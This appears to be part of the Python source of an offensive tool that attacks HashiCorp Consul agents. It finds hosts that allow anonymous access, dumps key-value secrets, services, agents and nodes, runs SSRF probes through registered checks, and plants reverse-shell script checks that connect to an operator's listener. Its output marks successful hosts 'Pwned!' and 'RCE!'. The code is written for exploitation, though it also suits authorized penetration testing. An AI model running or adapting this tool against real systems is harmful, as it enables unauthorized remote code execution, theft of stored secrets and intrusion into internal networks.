        "kv_key_requested": kv_key,
        "dump_requested": bool(dump_requested),
        "dump_all_requested": bool(dump_all_requested),
        "kv_keys_list": None,
        "kv_keys_error": None,
        "kv_dump_items": None,
        "kv_dump_error": None,
        "services_list_requested": bool(show_services),
        "service_dump_name": service_dump_name,
        "services_list_source": None,
        "services_list": None,
        "services_list_error": None,
        "service_instances": None,
        "service_instances_errors": None,
        "agents_list_requested": bool(show_agents),
        "agent_dump_name": agent_dump_name,
        "agents_list_source": None,
        "agents_list": None,
        "agents_list_error": None,
        "checks_list_requested": bool(show_checks),
        "check_dump_id": check_dump_id,
        "checks_list_source": None,
        "checks_list": None,
        "checks_list_error": None,
        "nodes_list_requested": bool(show_nodes),
        "node_dump_name": node_dump_name,
        "nodes_list_source": None,
        "nodes_list": None,
        "nodes_list_error": None,
        "service_result": None,
        "service_args": service_args,
        "script_revshell": None,
        "error": _friendly_error_text(last_error or "connection failed"),
        "elapsed_ms": None,
    }


def _cx_prefix(record: dict[str, Any]) -> str:
    host = _clip(str(record.get("host") or "-"), 64)
    port = str(record.get("port") or "-")
    return f"{_CONSUL_TAG:<8}\t{host}\t{port}\t"


def _detect_line(record: dict[str, Any], output_format: str) -> str:
    if output_format == "json":
        return json.dumps(record, ensure_ascii=False)

    prefix = _cx_prefix(record)
    if not bool(record.get("is_consul")):
        status = str(record.get("status") or "fail")
        if status == "not_consul":
            return f"{prefix} [-] not a Consul API"
        return f"{prefix} [!] connection failed err={_clip(str(record.get('error') or 'connection failed'), 96)}"

    anon_scopes = record.get("anonymous_scopes") if isinstance(record.get("anonymous_scopes"), dict) else {}
    auth_required = (not _all_scopes_ok(anon_scopes)) or _anonymous_acl_denied_with_filtered_empty(record, anon_scopes)
    version = str(record.get("version") or "-")
    return f"{prefix} [*] Consul Agent (auth required:{_bool_text(auth_required)}) (version:{version})"


def _summary_line(record: dict[str, Any]) -> str | None:
    if not bool(record.get("is_consul")):
        return None

    anonymous_scopes = record.get("anonymous_scopes") if isinstance(record.get("anonymous_scopes"), dict) else {}
    if _anonymous_acl_denied_with_filtered_empty(record, anonymous_scopes):
        return None
    if _all_scopes_ok(anonymous_scopes):
        if bool(record.get("rce")):
            return f"[+] anonymous access Pwned! {_scope_counts_suffix(anonymous_scopes)}"
        return f"[+] anonymous access {_scope_counts_suffix(anonymous_scopes)}"
    if _no_scopes_ok(anonymous_scopes):
        return None

    line = "[!] anonymous partial access"
    line += f" {_scope_bools_suffix(anonymous_scopes)}"
    line += f" {_scope_counts_suffix(anonymous_scopes)}"
    return line


def _auth_summary_line(record: dict[str, Any]) -> str | None:
    auth_mode = str(record.get("auth_mode") or "").strip()
    if not auth_mode:
        return None

    auth_valid = record.get("auth_valid")
    auth_scopes = record.get("auth_scopes") if isinstance(record.get("auth_scopes"), dict) else {}
    auth_error = str(record.get("auth_error") or "").strip()
    if auth_mode == "token":
        label = "token auth"
    else:
        label = f"{record.get('_username_display', '')}:{record.get('_password_display', '')}"
        if label == ":":
            label = "basic auth"
    if auth_valid is True:
        if bool(record.get("rce")):
            return f"[+] {label} Pwned! {_scope_counts_suffix(auth_scopes)}"
        return f"[+] {label} {_scope_counts_suffix(auth_scopes)}"
    line = f"[-] {label} failed"
    if auth_error:
        line += f" err={_clip(auth_error, 80)}"
    if auth_scopes:
        line += f" {_scope_bools_suffix(auth_scopes)}"
    return line


def _detail_lines(record: dict[str, Any], output_format: str, *, debug: bool = False) -> list[str]:
    if output_format == "json" or not bool(record.get("is_consul")):
        return []

    prefix = _cx_prefix(record)
    lines: list[str] = []

    anonymous_scopes = record.get("anonymous_scopes") if isinstance(record.get("anonymous_scopes"), dict) else {}
    if anonymous_scopes:
        for item in _scope_status_detail_lines(prefix, anonymous_scopes):
            lines.append(item)

    if debug:
        scheme = str(record.get("scheme") or "").strip()
        tls_auto = bool(record.get("tls_auto_insecure"))
        if scheme:
            line = f"{prefix} [*] Transport (scheme:{scheme})"
            if tls_auto:
                line += " (tls_auto_insecure:True)"
            lines.append(line)

        local_flag = record.get("local_script_checks")
        remote_flag = record.get("remote_script_checks")
        if local_flag is not None or remote_flag is not None:
            lines.append(
                f"{prefix} [*] Agent Config "
                f"(local_script_checks:{_bool_text(local_flag)}) "
                f"(remote_script_checks:{_bool_text(remote_flag)})"
            )
        if bool(record.get("rce")):
            lines.append(f"{prefix} [!] RCE! (EnableLocalScriptChecks:True) (EnableRemoteScriptChecks:True)")

    auth_scopes = record.get("auth_scopes") if isinstance(record.get("auth_scopes"), dict) else {}
    if auth_scopes:
        for item in _scope_status_detail_lines(prefix, auth_scopes):
            lines.append(item)

    dump_requested = bool(record.get("dump_requested"))
    dump_all_requested = bool(record.get("dump_all_requested"))
    kv_key_requested = str(record.get("kv_key_requested") or "").strip()
    if bool(record.get("keys_requested")) and not dump_requested:
        kv_keys = record.get("kv_keys_list")
        kv_keys_error = str(record.get("kv_keys_error") or "").strip()
        lines.append(f"{prefix} [*] KV Keys")
        if isinstance(kv_keys, list):
            if not kv_keys:
                lines.append(f"{prefix} <no keys>")
            for key_name in kv_keys:
                key_text = str(key_name or "").strip()
                if key_text:
                    lines.append(f"{prefix} {key_text}")
        elif kv_keys_error:
            lines.append(f"{prefix} [-] keys unavailable err={_clip(kv_keys_error, 120)}")
        else:
            lines.append(f"{prefix} [-] keys unavailable")

    if dump_requested and (dump_all_requested or kv_key_requested or bool(record.get("keys_requested"))):
        kv_dump = record.get("kv_dump_items")
        kv_dump_error = str(record.get("kv_dump_error") or "").strip()
        header = f"{prefix} [*] KV Dump"
        if kv_key_requested:
            header += f" (key:{kv_key_requested})"
        lines.append(header)
        if isinstance(kv_dump, list):
            if not kv_dump:
                if kv_key_requested:
                    lines.append(f"{prefix} <key not found>")
                else:
                    lines.append(f"{prefix} <no keys>")
            for item in kv_dump:
                if not isinstance(item, dict):
                    continue
                key_text = str(item.get("key") or "").strip()
                if not key_text:
                    continue
                value_text = str(item.get("value") or "")
                value_rendered = value_text if value_text else "<empty>"
                lines.append(f"{prefix} {key_text}={value_rendered}")
        elif kv_dump_error:
            lines.append(f"{prefix} [-] kv dump unavailable err={_clip(kv_dump_error, 120)}")
        else:
            lines.append(f"{prefix} [-] kv dump unavailable")

    if bool(record.get("services_list_requested")):
        services_items = record.get("services_list")
        services_error = str(record.get("services_list_error") or "").strip()
        services_source = str(record.get("services_list_source") or "").strip()
        service_dump_name = str(record.get("service_dump_name") or "").strip()
        service_instances_map = (
            record.get("service_instances") if isinstance(record.get("service_instances"), dict) else {}
        )
        service_instances_errors = (
            record.get("service_instances_errors") if isinstance(record.get("service_instances_errors"), dict) else {}
        )
        source_suffix = f" (source:{services_source})" if debug and services_source else ""
        filter_suffix = f" (service:{service_dump_name})" if service_dump_name else ""
        lines.append(f"{prefix} [*] Services{filter_suffix}{source_suffix}")
        if isinstance(services_items, list):
            if not services_items:
                lines.append(f"{prefix} <service not found>" if service_dump_name else f"{prefix} <no services>")
            for item in services_items:
                if not isinstance(item, dict):
                    continue
                name = str(item.get("name") or "").strip()
                if not name:
                    continue
                if dump_requested:
                    details_error = str(service_instances_errors.get(name) or "").strip()
                    details_items = service_instances_map.get(name)
                    if isinstance(details_items, list):
                        if not details_items:
                            lines.append(f"{prefix} {name}")
                            lines.append(f"{prefix} <no service instances>")
                            continue
                        for instance in details_items:
                            if not isinstance(instance, dict):
                                continue
                            node_name = str(instance.get("node_name") or "-")
                            node_addr = str(instance.get("node_address") or "-")
                            node_dc = str(instance.get("node_datacenter") or "-")
                            svc_addr = str(instance.get("service_address") or "-")
                            svc_port = str(instance.get("service_port") or "-")
                            svc_id = str(instance.get("service_id") or "-")
                            lines.append(f"{prefix} {name}")
                            lines.append(f"{prefix} node={node_name}")
                            lines.append(f"{prefix} node_addr={node_addr}")
                            lines.append(f"{prefix} dc={node_dc}")
                            lines.append(f"{prefix} service_addr={svc_addr}")
                            lines.append(f"{prefix} port={svc_port}")
                            lines.append(f"{prefix} id={svc_id}")

                            meta = instance.get("meta")
                            if isinstance(meta, dict) and meta:
                                lines.append(f"{prefix} [*] Meta (service:{name}) (id:{svc_id}) (node:{node_name})")
                                for k, v in sorted(meta.items(), key=lambda kv: str(kv[0]).lower()):
                                    key_text = str(k).strip()
                                    if not key_text:
                                        continue
                                    value_text = str(v).strip()
                                    if key_text == "redposture_args":
                                        lines.append(f"{prefix} args={value_text}")
                                    else:
                                        lines.append(f"{prefix} meta.{key_text}={value_text}")

                            checks = instance.get("checks")
                            if isinstance(checks, list) and checks:
                                lines.append(
                                    f"{prefix} [*] Checks (service:{name}) (id:{svc_id}) "
                                    f"(node:{node_name}) (count:{len(checks)})"
                                )
                                for check in checks:
                                    if not isinstance(check, dict):
                                        continue
                                    check_id = str(check.get("check_id") or "-")
                                    check_name = str(check.get("name") or "-")
                                    status_text = str(check.get("status") or "-")
                                    lines.append(f"{prefix} check_id={check_id}")
                                    if check_name and check_name != "-":
                                        lines.append(f"{prefix} check_name={check_name}")
                                    lines.append(f"{prefix} status={status_text}")

                                    for field in (
                                        "script",
                                        "type",
                                        "namespace",
                                        "partition",
                                        "http",
                                        "tcp",
                                        "grpc",
                                        "method",
                                    ):
                                        value = str(check.get(field) or "").strip()
                                        if value:
                                            lines.append(f"{prefix} {field}={value}")

                                    args = check.get("args")
                                    if isinstance(args, list) and args:
                                        for idx, arg in enumerate(args):
                                            lines.append(f"{prefix} arg[{idx}]={str(arg)}")

                                    for field in ("interval", "timeout", "ttl", "deregister_after"):
                                        value = str(check.get(field) or "").strip()
                                        if value:
                                            lines.append(f"{prefix} {field}={value}")

                                    notes = str(check.get("notes") or "").strip()
                                    if notes:
                                        lines.append(f"{prefix} notes={_normalize_inline_text(notes)}")
                                    definition_raw = str(check.get("definition_raw") or "").strip()
                                    if definition_raw:
                                        lines.append(f"{prefix} definition={definition_raw}")
                                    output = str(check.get("output") or "").strip()
                                    if output:
                                        lines.append(f"{prefix} output={_normalize_inline_text(output)}")
                            else:
                                lines.append(f"{prefix} <no checks>")
                        continue
                    if details_error:
                        lines.append(f"{prefix} {name}")
                        lines.append(f"{prefix} [-] service details unavailable err={_clip(details_error, 120)}")
                        continue
                lines.append(f"{prefix} {name}")
        elif services_error:
            lines.append(f"{prefix} [-] services unavailable err={_clip(services_error, 120)}")
        else:
            lines.append(f"{prefix} [-] services unavailable")

    if bool(record.get("agents_list_requested")):
        agents_items = record.get("agents_list")
        agents_error = str(record.get("agents_list_error") or "").strip()
        agents_source = str(record.get("agents_list_source") or "").strip()
        agent_dump_name = str(record.get("agent_dump_name") or "").strip()
        source_suffix = f" (source:{agents_source})" if debug and agents_source else ""
        filter_suffix = f" (agent:{agent_dump_name})" if agent_dump_name else ""
        lines.append(f"{prefix} [*] Agents{filter_suffix}{source_suffix}")
        if isinstance(agents_items, list):
            if not agents_items:
                lines.append(f"{prefix} <agent not found>" if agent_dump_name else f"{prefix} <no agents>")
            for item in agents_items:
                if not isinstance(item, dict):
                    continue
                name = str(item.get("name") or "").strip()
                if not name:
                    continue
                if dump_requested:
                    addr = str(item.get("addr") or "-")
                    dc = str(item.get("dc") or "-")
                    role = str(item.get("role") or "-")
                    port = str(item.get("port") or "-")
                    status = str(item.get("status") or "-")
                    lines.append(
                        f"{prefix} {name} (addr:{addr}) (port:{port}) (dc:{dc}) (role:{role}) (status:{status})"
                    )
                else:
                    lines.append(f"{prefix} {name}")
        elif agents_error:
            lines.append(f"{prefix} [-] agents unavailable err={_clip(agents_error, 120)}")
        else:
            lines.append(f"{prefix} [-] agents unavailable")

    if bool(record.get("checks_list_requested")):
        checks_items = record.get("checks_list")
        checks_error = str(record.get("checks_list_error") or "").strip()
        checks_source = str(record.get("checks_list_source") or "").strip()
        check_dump_id = str(record.get("check_dump_id") or "").strip()
        source_suffix = f" (source:{checks_source})" if debug and checks_source else ""
        filter_suffix = f" (id:{check_dump_id})" if check_dump_id else ""
        if isinstance(checks_items, list):
            lines.append(f"{prefix} [*] Agent Checks{filter_suffix}{source_suffix} (count:{len(checks_items)})")
            if not checks_items:
                lines.append(f"{prefix} <check not found>" if check_dump_id else f"{prefix} <no checks>")
            for item in checks_items:
                if not isinstance(item, dict):
                    continue
                check_id = str(item.get("check_id") or "").strip()
                if not check_id:
                    continue
                check_name = str(item.get("name") or "").strip()
                status_text = str(item.get("status") or "-")
                service_id = str(item.get("service_id") or "").strip()
                if not dump_requested:
                    summary = f"{check_id} (status:{status_text})"
                    if service_id:
                        summary += f" (service:{service_id})"
                    if check_name and check_name != "-":
                        summary += f" (name:{_normalize_inline_text(check_name)})"
                    lines.append(f"{prefix} {summary}")
                    continue

                header = f"{prefix} [*] Check (id:{check_id}) (status:{status_text})"
                if service_id:
                    header += f" (service:{service_id})"
                if check_name and check_name != "-":
                    header += f" (name:{_normalize_inline_text(check_name)})"
                lines.append(header)

                for field in ("script", "type", "namespace", "partition", "http", "tcp", "grpc", "method"):
                    value = str(item.get(field) or "").strip()
                    if value:
                        lines.append(f"{prefix} {field}={value}")

                args = item.get("args")
                if isinstance(args, list) and args:
                    for idx, arg in enumerate(args):
                        lines.append(f"{prefix} arg[{idx}]={str(arg)}")

                for field in ("interval", "timeout", "ttl", "deregister_after"):
                    value = str(item.get(field) or "").strip()
                    if value:
                        lines.append(f"{prefix} {field}={value}")

                notes = str(item.get("notes") or "").strip()
                if notes:
                    lines.append(f"{prefix} notes={_normalize_inline_text(notes)}")
                definition_raw = str(item.get("definition_raw") or "").strip()
                if definition_raw:
                    lines.append(f"{prefix} definition={definition_raw}")
                output = str(item.get("output") or "").strip()
                if output:
                    lines.append(f"{prefix} output={_normalize_inline_text(output)}")
        elif checks_error:
            lines.append(f"{prefix} [*] Agent Checks{filter_suffix}{source_suffix}")
            lines.append(f"{prefix} [-] checks unavailable err={_clip(checks_error, 120)}")
        else:
            lines.append(f"{prefix} [*] Agent Checks{filter_suffix}{source_suffix}")
            lines.append(f"{prefix} [-] checks unavailable")

    if bool(record.get("nodes_list_requested")):
        nodes_items = record.get("nodes_list")
        nodes_error = str(record.get("nodes_list_error") or "").strip()
        nodes_source = str(record.get("nodes_list_source") or "").strip()
        node_dump_name = str(record.get("node_dump_name") or "").strip()
        source_suffix = f" (source:{nodes_source})" if debug and nodes_source else ""
        filter_suffix = f" (node:{node_dump_name})" if node_dump_name else ""
        lines.append(f"{prefix} [*] Nodes{filter_suffix}{source_suffix}")
        if isinstance(nodes_items, list):
            if not nodes_items:
                lines.append(f"{prefix} <node not found>" if node_dump_name else f"{prefix} <no nodes>")
            for item in nodes_items:
                if not isinstance(item, dict):
                    continue
                name = str(item.get("name") or "").strip()
                if not name:
                    continue
                if dump_requested:
                    addr = str(item.get("address") or "-")
                    dc = str(item.get("datacenter") or "-")
                    lines.append(f"{prefix} {name} (addr:{addr}) (dc:{dc})")
                else:
                    lines.append(f"{prefix} {name}")
        elif nodes_error:
            lines.append(f"{prefix} [-] nodes unavailable err={_clip(nodes_error, 120)}")
        else:
            lines.append(f"{prefix} [-] nodes unavailable")

    service_result = record.get("service_result")
    if isinstance(service_result, dict) and str(service_result.get("name") or "").strip():
        service_name = str(service_result.get("name") or "").strip()
        action = str(service_result.get("action") or "create").strip().lower()
        service_args = str(service_result.get("args") or "").strip()
        lines.append(f"{prefix} [*] Service {service_name}")
        if bool(service_result.get("ok")):
            verb = "deleted" if action == "delete" else "created"
            lines.append(f"{prefix} [+] service {verb}")
            if action != "delete" and service_args:
                lines.append(f"{prefix} args={_normalize_inline_text(service_args)}")
        else:
            verb = "delete" if action == "delete" else "create"
            err = _clip(str(service_result.get("error") or "service action failed"), 120)
            status = service_result.get("status")
            if debug and isinstance(status, int) and status > 0:
                lines.append(f"{prefix} [-] service {verb} failed err={err} status={status}")
            else:
                lines.append(f"{prefix} [-] service {verb} failed err={err}")

    ssrf_results = record.get("ssrf_results")
    if isinstance(ssrf_results, list) and ssrf_results:
        lines.append(f"{prefix} [*] SSRF Check")
        total = len(ssrf_results)
        for index, item in enumerate(ssrf_results, start=1):
            if not isinstance(item, dict):
                continue
            target_url = str(item.get("target_url") or "-")
            lines.append(f"{prefix} [*] SSRF {index}/{total} -> {target_url}")
            if bool(item.get("registered")):
                lines.append(f"{prefix} [+] check registered")
            else:
                err = _clip(str(item.get("register_error") or "register failed"), 120)
                lines.append(f"{prefix} [-] check register failed err={err}")
            status_text = str(item.get("status") or "").strip()
            output_text = str(item.get("output") or "").strip()
            poll_error = str(item.get("poll_error") or "").strip()
            if status_text:
                lines.append(f"{prefix} [+] probe status={status_text}")
            elif poll_error:
                lines.append(f"{prefix} [-] probe failed err={_clip(poll_error, 120)}")
            if output_text:
                lines.append(f"{prefix} output={' '.join(output_text.split())}")
            if bool(item.get("deregistered")):
                lines.append(f"{prefix} [+] check deregistered")
            else:
                dereg_err = _clip(str(item.get("deregister_error") or "deregister failed"), 120)
                lines.append(f"{prefix} [-] check deregister failed err={dereg_err}")

    script_revshell = record.get("script_revshell")
    if isinstance(script_revshell, dict):
        if str(script_revshell.get("action") or "").strip().lower() == "delete":
            target_check_id = str(script_revshell.get("target_check_id") or "").strip()
            if target_check_id:
                lines.append(f"{prefix} [*] Reverse-shell cleanup (check_id:{target_check_id})")
            else:
                prefix_text = str(script_revshell.get("check_id_prefix") or _CONSUL_REVSHELL_CHECK_ID_PREFIX)
                lines.append(f"{prefix} [*] Reverse-shell cleanup (prefix:{prefix_text})")
            if not bool(script_revshell.get("queried")):
                err = str(script_revshell.get("query_error") or "checks query failed").strip()
                lines.append(f"{prefix} [-] checks query failed err={_clip(err, 120)}")
            else:
                matched = int(script_revshell.get("matched") or 0)
                deleted = int(script_revshell.get("deleted") or 0)
                lines.append(f"{prefix} [*] matched={matched} deleted={deleted}")
                items = script_revshell.get("items")
                if isinstance(items, list):
                    if not items:
                        lines.append(
                            f"{prefix} <check not found>" if target_check_id else f"{prefix} <no revshell checks>"
                        )
                    for item in items:
                        if not isinstance(item, dict):
                            continue
                        check_id = str(item.get("check_id") or "-")
                        if bool(item.get("ok")):
                            lines.append(f"{prefix} [+] check deregistered id={check_id}")
                        else:
                            err = str(item.get("error") or "").strip()
                            status = item.get("status")
                            if not err and status is not None:
                                err = f"status={status}"
                            lines.append(
                                f"{prefix} [-] check deregister failed id={check_id} err={_clip(err or 'unknown', 120)}"
                            )
        else:
            listener = str(script_revshell.get("listener") or "-")
            auto_cleanup = bool(script_revshell.get("auto_cleanup", True))
            lines.append(
                f"{prefix} [*] Reverse-shell script-check (listener:{listener}) "
                f"(auto_cleanup:{_bool_text(auto_cleanup)})"
            )
            payload_text = str(script_revshell.get("script") or "").strip()
            if payload_text:
                lines.append(f"{prefix} [*] payload={_normalize_inline_text(payload_text)}")
            if script_revshell.get("registered"):
                check_id = str(script_revshell.get("check_id") or "-")
                wait_seconds = script_revshell.get("wait_seconds")
                if isinstance(wait_seconds, (int, float)):
                    wait_text = f"{wait_seconds:.1f}s"
                else:
                    wait_text = "-"
                lines.append(f"{prefix} [+] check registered id={check_id} wait={wait_text}")
                if auto_cleanup:
                    if script_revshell.get("deregistered"):
                        lines.append(f"{prefix} [+] check deregistered")
                    else:
                        dereg_err = script_revshell.get("deregister_error")
                        dereg_status = script_revshell.get("deregister_status")
                        if not dereg_err and dereg_status is not None:
                            dereg_err = f"status={dereg_status}"
                        lines.append(
                            f"{prefix} [-] check deregister failed err={_clip(str(dereg_err or 'unknown'), 120)}"
                        )
                else:
                    lines.append(f"{prefix} [*] check left registered (use --delete --check-id {check_id})")
            else:
                register_err = script_revshell.get("register_error")
                register_status = script_revshell.get("register_status")
                if not register_err and register_status is not None:
                    register_err = f"status={register_status}"
                lines.append(f"{prefix} [-] check register failed err={_clip(str(register_err or 'unknown'), 120)}")

    return lines


def _render_colored_consul_line(console: Console, line: str) -> bool:
    if not line.startswith(_CONSUL_TAG):
        return False

    marker_color = {"[*]": "cyan", "[+]": "bright_green", "[-]": "yellow", "[!]": "red"}
    for marker in ("[!]", "[-]", "[+]", "[*]"):
        token = f" {marker} "
        if token not in line:
            continue
        left, right = line.split(token, 1)
        tag = _CONSUL_TAG
        rest = left[len(tag) :] if left.startswith(tag) else left

        spans: list[tuple[int, int, str]] = []
        for fragment, color in (
            ("(auth required:True)", "bright_green"),
            ("(auth required:False)", "red"),
            ("(auth required:unknown)", "yellow"),
            ("(EnableLocalScriptChecks:True)", "red"),
            ("(EnableRemoteScriptChecks:True)", "red"),
            ("(local_script_checks:True)", "red"),
            ("(remote_script_checks:True)", "red"),
            ("Pwned!", "orange"),
        ):
            idx = right.find(fragment)
            if idx >= 0:
                spans.append((idx, idx + len(fragment), color))

        for pattern, color in (
            (r"\(kv:(\d+)\)", "red"),
            (r"\(services:(\d+)\)", "orange"),
            (r"\(agents:(\d+)\)", "orange"),
        ):
            for match in re.finditer(pattern, right):
                if match.group(1).isdigit() and int(match.group(1)) > 0:
                    spans.append((match.start(), match.end(), color))

        chunks: list[str] = []
        cursor = 0
        for start, end, color in sorted(spans, key=lambda x: x[0]):
            if start > cursor:
                chunks.append(console._paint(right[cursor:start], "white", sys.stdout))
            chunks.append(console._paint(right[start:end], color, sys.stdout))
            cursor = end
        if cursor < len(right):
            chunks.append(console._paint(right[cursor:], "white", sys.stdout))

        right_colored = "".join(chunks)

        rendered = (
            f"{console._paint(tag, 'blue', sys.stdout)}"
            f"{console._paint(rest, 'white', sys.stdout)} "
            f"{console._paint(marker, marker_color.get(marker, 'white'), sys.stdout)} "
            f"{right_colored}"
        )
        console.plain(rendered)
        return True
    return False


def _emit_line(out_fh: Any, emit_line: Callable[[str], None] | None, line: str) -> None:
    if out_fh is not None:
        out_fh.write(line + "\n")
        out_fh.flush()
    if emit_line is not None:
        emit_line(line)


def audit_consul_targets(
    hosts: list[str],
    port: int,
    timeout: float,
    retries: int,
    workers: int,
    *,
    token: str | None,
    username: str | None,
    password: str | None,
    do_ssrf: bool,
    ssrf_urls: list[str],
    show_keys: bool,
    kv_key: str | None,
    dump_requested: bool,
    dump_all_requested: bool,
    show_services: bool,
    show_agents: bool,
    show_checks: bool,
    check_dump_id: str | None,
    show_nodes: bool,
    service_name: str | None,
    service_dump_name: str | None,
    agent_dump_name: str | None,
    node_dump_name: str | None,
    delete_service: bool,
    service_args: str | None,
    revshell_enabled: bool,
    delete_revshell: bool,
    revshell_listen: bool,
    revshell_host: str | None,
    revshell_port: int | None,
    revshell_payload: str | None,
    revshell_check_id: str | None,
    output_path: str | None,
    output_format: str,
    emit_line: Callable[[str], None] | None = None,
    logger: AttemptLogger | None = None,
    append_output: bool = False,
    suppress_timeout_status_lines: bool = False,
) -> tuple[int, int, int, bool]:
    total = 0
    detected = 0
    failed = 0
    revshell_registered_any = False

    out_fh: Any = None
    if output_path:
        os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
        out_fh = open(output_path, "a" if append_output else "w", encoding="utf-8")

    try:
        with ThreadPoolExecutor(max_workers=max(1, workers)) as executor:
            future_map = {
                executor.submit(
                    _audit_consul_host,
                    host,
                    port,
                    timeout,
                    retries,
                    token=token,
                    username=username,
                    password=password,
                    do_ssrf=do_ssrf,
                    ssrf_urls=ssrf_urls,
                    show_keys=show_keys,
                    kv_key=kv_key,
                    dump_requested=dump_requested,
                    dump_all_requested=dump_all_requested,
                    show_services=show_services,
                    show_agents=show_agents,
                    show_checks=show_checks,
                    check_dump_id=check_dump_id,
                    show_nodes=show_nodes,
                    service_name=service_name,
                    service_dump_name=service_dump_name,
                    agent_dump_name=agent_dump_name,
                    node_dump_name=node_dump_name,
                    delete_service=delete_service,
                    service_args=service_args,
                    revshell_enabled=revshell_enabled,
                    delete_revshell=delete_revshell,
                    revshell_listen=revshell_listen,
                    revshell_host=revshell_host,
                    revshell_port=revshell_port,
                    revshell_payload=revshell_payload,
                    revshell_check_id=revshell_check_id,
                ): host
                for host in hosts
            }
            for future in as_completed(future_map):
                host_for_future = str(future_map.get(future) or "-")
                try:
                    record = future.result()
                except Exception as exc:
                    record = {
                        "timestamp": utc_now_iso(),
                        "host": host_for_future,
                        "port": port,
                        "is_consul": False,
                        "status": "fail",
                        "scheme": None,
                        "version": None,
                        "anonymous_scopes": {},
                        "auth_mode": None,
                        "auth_valid": None,
                        "auth_scopes": {},
                        "error": f"internal worker error: {exc}",
                    }
                total += 1
                if bool(record.get("is_consul")):
                    detected += 1
                if str(record.get("status") or "fail") == "fail":
                    failed += 1
                script_revshell = record.get("script_revshell")
                if (
                    isinstance(script_revshell, dict)
                    and str(script_revshell.get("action") or "").strip().lower() != "delete"
                    and bool(script_revshell.get("registered"))
                ):
                    revshell_registered_any = True

                record_out = dict(record)
                if username is not None or password is not None:
                    record_out["_username_display"] = username or ""
                    record_out["_password_display"] = password or ""

                suppress_timeout_detect_line = (
                    suppress_timeout_status_lines
                    and output_format == "txt"
                    and _is_connection_timeout_fail_record(record_out)
                )
                if not suppress_timeout_detect_line:
                    _emit_line(out_fh, emit_line, _detect_line(record_out, output_format))
                line = _summary_line(record_out)
                suppress_anonymous_summary = (
                    output_format == "txt"
                    and bool(str(record_out.get("auth_mode") or "").strip())
                    and record_out.get("auth_valid") is True
                )
                if line and not suppress_anonymous_summary:
                    _emit_line(out_fh, emit_line, f"{_cx_prefix(record_out)} {line}")
                auth_line = _auth_summary_line(record_out)
                if auth_line:
                    _emit_line(out_fh, emit_line, f"{_cx_prefix(record_out)} {auth_line}")
                for detail in _detail_lines(record_out, output_format, debug=(logger is not None)):
                    _emit_line(out_fh, emit_line, detail)

                if logger is not None:
                    anon_scopes = record.get("anonymous_scopes", {})
                    script_data = record.get("script_revshell")
                    logger.log(
                        "consul",
                        (str(record.get("host") or "-"), int(record.get("port") or port)),
                        phase="audit",
                        status=record.get("status"),
                        scheme=record.get("scheme"),
                        version=record.get("version"),
                        anon_kv=bool(anon_scopes.get("kv", {}).get("ok")),
                        anon_services=bool(anon_scopes.get("services", {}).get("ok")),
                        anon_agents=bool(anon_scopes.get("agents", {}).get("ok")),
                        rce=bool(record.get("rce")),
                        error=record.get("error"),
                        revshell=bool(script_data and script_data.get("registered")),
                    )
    finally:
        if out_fh is not None:
            out_fh.close()

    return total, detected, failed, revshell_registered_any


def run_consul_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
    console = Console(debug=args.debug)

    if args.timeout <= 0:
        console.error("--timeout must be > 0")
        return 2
    if args.retries < 0:
        console.error("--retries must be >= 0")
        return 2

    try:
        ports = collect_scan_ports(getattr(args, "ports", None))
    except ValueError as exc:
        console.error(f"failed to parse --port: {exc}")
        return 2
    if not ports:
        ports = [int(args.port)]

    targets = getattr(args, "targets", None) or getattr(args, "hosts", None)
    hosts_file = getattr(args, "hosts_file", None)
    if hosts_file:
        targets = f"{targets},{hosts_file}" if targets else hosts_file
    try:
        hosts = collect_scan_targets(targets)
    except (OSError, ValueError) as exc:
        console.error(f"failed to parse targets: {exc}")
        return 2
    if not hosts:
        console.error("consul requires -t/--targets")
        return 2

    token = (getattr(args, "token", None) or "").strip() or None
    username = getattr(args, "username", None)
    password = getattr(args, "password", None)
    if token and (username is not None or password is not None):
        console.warn("--token is set; Basic auth credentials are ignored")
        username = None
        password = None

    ssrf_target = getattr(args, "ssrf_target", None)
    ssrf_port = getattr(args, "ssrf_port", None)
    ssrf_path = getattr(args, "ssrf_path", None)
    do_ssrf = bool(str(ssrf_target or "").strip())
    if not do_ssrf and (ssrf_port or ssrf_path):
        console.error("--ssrf-port/--ssrf-path require --ssrf-target")
        return 2
    try:
        ssrf_urls = _normalize_ssrf_urls(ssrf_target, ssrf_port, ssrf_path) if do_ssrf else []
    except ValueError as exc:
        console.error(f"failed to parse --ssrf-port: {exc}")
        return 2
    if do_ssrf and not ssrf_urls:
        console.error("no valid SSRF targets generated from --ssrf-target/--ssrf-port")
        return 2

    show_keys = bool(getattr(args, "show_keys", False))
    kv_key = (getattr(args, "kv_key", None) or "").strip() or None
    dump_requested = bool(getattr(args, "dump", False))
    show_services = bool(getattr(args, "show_services", False))
    show_agents = bool(getattr(args, "show_agents", False))
    show_checks = bool(getattr(args, "show_checks", False))
    show_nodes = bool(getattr(args, "show_nodes", False))
    service_dump_name = (getattr(args, "service_dump_name", None) or "").strip() or None
    agent_dump_name = (getattr(args, "agent_name", None) or "").strip() or None
    node_dump_name = (getattr(args, "node_name", None) or "").strip() or None
    service_name = None
    service_args = None
    delete_service = False
    if kv_key and not dump_requested:
        console.error("--key requires --dump")
        return 2
    if service_dump_name and not dump_requested:
        console.error("--service requires --dump")
        return 2
    if agent_dump_name and not dump_requested:
        console.error("--agent requires --dump")
        return 2
    if node_dump_name and not dump_requested:
        console.error("--node requires --dump")
        return 2
    revshell_enabled = bool(getattr(args, "revshell", False))
    delete_revshell = bool(getattr(args, "delete_revshell", False))
    revshell_listen = bool(getattr(args, "revshell_listen", False))
    revshell_host = (getattr(args, "revshell_host", None) or "").strip() or None
    revshell_port = getattr(args, "revshell_port", None)
    revshell_payload = (getattr(args, "revshell_payload", None) or "").strip() or None
    revshell_check_id_raw = (getattr(args, "revshell_check_id", None) or "").strip() or None
    revshell_check_id = revshell_check_id_raw
    if revshell_check_id and revshell_check_id.lower().startswith("id:"):
        revshell_check_id = revshell_check_id[3:].strip() or None
        if not revshell_check_id:
            console.error("--check-id id:<value> requires a non-empty check id")
            return 2
    check_id_used_for_dump = bool(revshell_check_id and dump_requested)
    delete_by_id_without_revshell = bool(delete_revshell and not revshell_enabled and revshell_check_id)
    if delete_revshell and not revshell_enabled and not revshell_check_id:
        console.error("--delete requires --revshell or --check-id")
        return 2
    if revshell_check_id and not (revshell_enabled or delete_revshell or dump_requested):
        console.error("--check-id requires --revshell, --delete, or --dump")
        return 2
    if revshell_listen and not revshell_enabled:
        console.error("--listen requires --revshell")
        return 2
